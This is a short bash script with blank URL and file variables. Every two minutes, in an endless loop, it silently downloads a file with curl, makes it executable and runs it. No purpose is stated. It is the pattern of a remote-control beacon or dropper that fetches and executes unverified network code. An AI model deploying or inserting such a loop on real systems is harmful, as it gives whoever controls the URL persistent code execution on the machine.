#!/bin/bash

URL=""
TMP_FILE=""

while true; do
    curl -s -o "$TMP_FILE" "$URL"
    chmod +x "$TMP_FILE"
    bash "$TMP_FILE"
    sleep 120
done
